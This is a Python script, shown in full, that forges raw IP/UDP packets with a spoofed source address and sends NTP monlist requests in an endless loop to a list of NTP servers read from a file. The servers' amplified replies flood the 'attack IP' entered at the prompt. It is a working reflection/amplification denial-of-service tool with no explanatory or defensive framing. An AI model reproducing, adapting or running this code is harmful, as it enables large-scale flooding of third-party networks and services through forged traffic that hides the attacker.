#!/usr/bin/python
#-*-coding:utf-8-*-

import socket
import struct
import threading
import random

def checksum(data):
    s = 0
    n = len(data) % 2
    for i in range(0, len(data)-n, 2):
        s+= ord(data[i]) + (ord(data[i+1]) << 8)
    if n:
        s+= ord(data[i+1])
    while (s >> 16):
        s = (s & 0xFFFF) + (s >> 16)
    s = ~s & 0xffff
    return s

def IP(source,destination,udplen):
	version = 4
	ihl = 5
	tos = 0
	tl = 20+udplen
	ip_id = random.randint(1,65530)
	flags = 0 
	offset = 0
	ttl = 128
	protocol =17
	check =0
	source = socket.inet_aton(source)
	destination = socket.inet_aton(destination)

	ver_ihl = (version << 4)+ihl
	flags_offset = (flags << 13)+offset
	ip_header = struct.pack("!BBHHHBBH4s4s",
                    ver_ihl,
                    tos,
                    tl,
                    ip_id,
                    flags_offset,
                    ttl,
                    protocol,
                    check,
                    source,
                    destination)
	check=checksum(ip_header)
	ip_header = struct.pack("!BBHHHBBH4s4s",
                    ver_ihl,
                    tos,
                    tl,
                    ip_id,
                    flags_offset,
                    ttl,
                    protocol,
                    socket.htons(check),
                    source,
                    destination)  
	return ip_header

def udp(sp,dp,datalen):
	srcport=sp
	dstport=dp
	udplen=8+datalen
	udp_checksum=0
	udp_header = struct.pack("!HHHH",srcport,dstport,udplen,udp_checksum)
	return udp_header


def re_att(srcip,srcport):
	NTP_data='\x17'+'\x00'+'\x03'+'\x2a'+200*'\x00'
	n=len(ipaddr)-1
	while 1:
		for i in range(ipaddr_len):
		
			dstip=ipaddr[i]
			datalen=len(NTP_data)
			
			udp_header=udp(srcport,123,datalen)
			ip_header=IP(srcip,dstip,len(udp_header)+datalen)
	
			ip_packet=ip_header+udp_header+NTP_data

			s.sendto(ip_packet,(dstip,123))


proto_udp=17
proto_tcp=6
s = socket.socket(socket.AF_INET,socket.SOCK_RAW,17)
s.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
ipaddr=[]
f = open("ipadd1.txt","r")
lines=f.readlines()
for line in lines:
	line=line.strip('\r\n')
	ipaddr.append(line)
#print ipaddr
ipaddr_len=len(ipaddr)
srcip=raw_input('attack IP:')
srcport=int(input('attack PORT:'))

while 1:
	re_att(srcip,srcport)




















